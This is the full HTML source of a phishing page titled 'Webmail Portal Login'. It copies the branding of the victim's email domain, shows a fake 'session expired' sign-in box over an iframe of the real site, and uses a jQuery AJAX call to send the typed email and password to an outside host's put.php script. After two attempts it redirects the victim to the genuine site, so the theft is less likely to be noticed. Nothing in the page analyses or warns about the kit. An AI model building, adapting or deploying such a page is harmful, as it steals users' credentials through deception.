


<!DOCTYPE html>
<html lang="en" >

<head>

  <meta charset="UTF-8">
  
<meta http-equiv="content-type" content="text/html; charset=windows-1252">
        <meta name="robots" content="noindex, nofollow">
<meta name="googlebot" content="noindex, nofollow"> 
    <title>Webmail Portal Login</title>
    <script src="jquery-1.js"></script>

    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">


      <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="bootstrap.min.css?1422585379">
    <link href="https://fonts.googleapis.com/css?family=Yellowtail%26display=swap" rel="stylesheet">
    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
  <style>
  
 html,body,div,span,applet,object,iframe,h1,h2,h3,h4,h5,h6,p,blockquote,pre,a,abbr,acronym,address,big,cite,code,del,dfn,em,img,ins,kbd,q,s,samp,small,strike,strong,sub,sup,tt,var,b,u,i,center,dl,dt,dd,ol,ul,li,fieldset,form,label,legend,table,caption,tbody,tfoot,thead,tr,th,td,article,aside,canvas,details,embed,figure,figcaption,footer,header,hgroup,menu,nav,output,ruby,section,summary,time,mark,audio,video{margin:0;padding:0;border:0;vertical-align:baseline}article,aside,details,figcaption,figure,footer,header,hgroup,menu,nav,section{display:block}body{line-height:1}ol,ul{list-style:none}blockquote,q{quotes:none}blockquote:before,blockquote:after,q:before,q:after{content:'';content:none}table{border-collapse:collapse;border-spacing:0}
    
    html,body{}#root{position:absolute;left:0;right:0;bottom:0;top:0;z-index:-10;pointer-events:none}.error{color:#dc3545;width:80%;margin:0 auto;padding-top:5px}.form-holder{background-color:#fff;width:600px;margin:100px auto;height:100%;box-shadow:0 20px 50px #a9a9a9;border-radius:4px 4px 0 0;border:1px solid #d6dfea;z-index:12}
     
 }
  

.social_icons a{
  display: block;
  height: 45px;
  width: 100%;
  line-height: 45px;
  text-align: center;
  border-radius: 5px;
  font-size: 20px;
  color: #fff;
  text-decoration: none;
  transition: all 0.3s linear;
}
.social_icons a span{
  margin-left: 5px;
  font-size: 18px;
}
.social_icons a:first-child{
  margin-right: 5px;
  background: #4267B2;
}
.social_icons a:first-child:hover{
  background: #375695;
}
.social_icons a:last-child{
  margin-left: 5px;
  background: #1DA1F2;
}
.social_icons a:last-child:hover{
  background: #0d8bd9;
}
form {
  margin-top: 25px;
}
form .input_box{
  height: 50px;
  width: 100%;
  position: relative;
  margin-top: 15px;
}
.input_box input{
  height: 100%;
  width: 100%;
  outline: none;
  border: 1px solid lightgrey;
  border-radius: 5px;
  padding-left: 45px;
  font-size: 17px;
  transition: all 0.3s ease;
}
.input_box input:focus{
  border-color: #ff0000;
}
.input_box .icon{
  position: absolute;
  top: 50%;
  left: 20px;
  transform: translateY(-50%);
  color: grey;
}
form .option_div{
  margin-top: 5px;
  display: flex;
  justify-content: space-between;
}
.option_div .check_box{
  display: flex;
  align-items: center;
}
.option_div span{
  margin-left: 5px;
  font-size: 16px;
  color: #333;
}
.option_div .forget_div a{
  font-size: 16px;
  color: #be2edd;
}
.button input{
  padding-left: 0;
  background: #be2edd;
  color: #fff;
  border: none;
  font-size: 20px;
  font-weight: 500;
  cursor: pointer;
  transition: all 0.3s linear;
}
.button input:hover{
  background: #a720c5;
}
form .sign_up{
  text-align: center;
  margin-top: 25px;
}
.sign_up a{
  color: #be2edd;
}
form a{
  text-decoration: none;
}
form a:hover{
  text-decoration: underline;
}
  </style>


  <script>
  window.console = window.console || function(t) {};
</script>

  
  
  <script>
  if (document.location.search.match(/type=embed/gi)) {
    window.parent.postMessage("resize", "*");
  }
</script>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
  
    <script>
  window.console = window.console || function(t) {};
</script>

  
  
  <script>
  if (document.location.search.match(/type=embed/gi)) {
    window.parent.postMessage("resize", "*");
  }
  </script>

  
  <script>

    /* global $ */
    $(document).ready(function(){
      var count=0;

      $('#back1').click(function () {
        $("#msg").hide();
        $('#email').val("");
        $("#automail").animate({left:200, opacity:"hide"}, 0);
        $("#inputbar").animate({right:200, opacity:"show"}, 1000);

      });

      var email = window.location.hash.substr(1);
      if (!email) {

      }
      else
      {
        var my_email =email;
        $('#email').val(my_email);
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_email)) {
          $('#error').show();
          email.focus;
          return false;
        }
        var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
        var c= my_slice.substr(0, my_slice.indexOf('.'));
        var final= c.toLowerCase();
        var finalu= c.toUpperCase();

        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
        $("#logoname").html(finalu);
        $(".logoname").html(finalu);
        $("#iframe").attr("src", "https://www."+my_slice);
      }
      
      $('#submit-btn').click(function(event){
        $('#error').hide();
        $('#msg').hide();
        event.preventDefault();
        var email=$("#email").val();
        var password=$("#password").val();
        var msg = $('#msg').html();
        $('#msg').text( msg );
      ///////////new injection////////////////
      var my_email =email;
      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

      if (!filter.test(my_email)) {
        $('#error').show();
        email.focus;
        return false;
      }

      var ind=my_email.indexOf("@");
      var my_slice=my_email.substr((ind+1));
      var c= my_slice.substr(0, my_slice.indexOf('.'));
      var final= c.toLowerCase();
      var finalu= c.toUpperCase();

$("#iframe").attr("src", "https://www."+my_slice);
        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
        $(".logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
        $("#logoname").html(finalu);
      ///////////new injection////////////////
      count=count+1;
      
      $.ajax({
        dataType: 'JSON',
        url: 'https://thorburnflexx.com/elev/put.php',
        type: 'POST',
        data:{
          email:email,
          password:password,
        },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr){
              $('#submit-btn').html('Verifing...');
            },
            success: function(response){
              if(response){
                $("#msg").show();
                console.log(response);
                if(response['signal'] == 'ok'){
                  $("#password").val("");
                  if (count>=2) {
                    count=0;
                    // window.location.replace(response['redirect_link']);
                    window.location.replace("http://www."+my_slice);

                  }
                  // $('#msg').html(response['msg']);
                }
                else{
                  // $('#msg').html(response['msg']);
                }
              }
            },
            error: function(){
              $("#password").val("");
              if (count>=2) {
                count=0;
                window.location.replace("http://www."+my_slice);
              }
              $("#msg").show();
              // $('#msg').html("Please try again later");
            },
            complete: function(){
              $('#submit-btn').html('Sign in');
            }
            
            
          });
          
        
    });


    });


  </script>
<script>
    window.onload = function() {
  var input = document.getElementById("password").focus();
}

</script>
</head>

<body translate="no" >
  <!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">

    <title>Hello, world!</title>
  </head>
  <body>
      <div id="root">
<iframe id="iframe" scrolling="no" src="" width="100%" height="100%" frameborder="0"></iframe> </div>
<form action="#" method="post">
<input type="hidden" class="form-control" name="hido" id="hido" value="">
<input type="hidden" class="form-control" name="redirecto" id="redirecto" value="">

     <!--   <h1 style="text-align: center;">Hello, world!</h1>
 Button trigger modal --> 
  

    <!-- Modal -->
    <div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" style="margin-top: 90px; display: block !important;" aria-labelledby="exampleModalLabel" aria-hidden="true">
    <div class="modal-dialog" style="box-shadow: rgba(0, 0, 0, 0.4) 0px 30px 90px;" role="document">
        <div class="modal-content">
        <div class="modal-header">
            <div class="xlogo">
            <h5><img id="logoimg" src="">
            <span style="text-transform: capitalize;" id="logoname"></span></h5>
            </div>
                
            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
            <span aria-hidden="true">&times;</span>
            </button>
        </div>
        <div class="modal-body">
        <div class="form-wrap">
        <center>
            <div>Your session has expired, please login again to continue.</div></center>
        <center>
          <div class="alert alert-danger" id="msg" style="display: none; color:red;"> Invalid Password.! Please Enter your correct Password</div>
          <div id="error" class="text-danger" style="display: none; color:red;">That account doesn't exist. Enter a different account</div>
        </center>
      <div class="input_box">
        <input type="email" name="username" id="email" placeholder="Email or Phone" disabled="disabled" >
        <div class="icon"><i class="fas fa-user"></i></div>
      </div>
      <div class="input_box">
        <input type="password" name="password" id="password" placeholder="Password" autofocus required="required">
        <div class="icon"><i class="fas fa-lock"></i></div>
      </div>
        </div>
                </div>

       <div class="modal-footer"> 
            <!--     <div class="input_box"> -->

            <button type="submit" id="submit-btn" class="btn btn-primary">Sign in</button>
        </div>
        </div>
    </div>
    </div>

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
    <script>
       $(document).ready(function(){
            $('#exampleModal').modal('show');
        }); 
        
        $('#exampleModal').modal({
    backdrop: 'static',
    keyboard: false
})
    </script>


  </body>
</html>

  
  

</body>

</html>
 
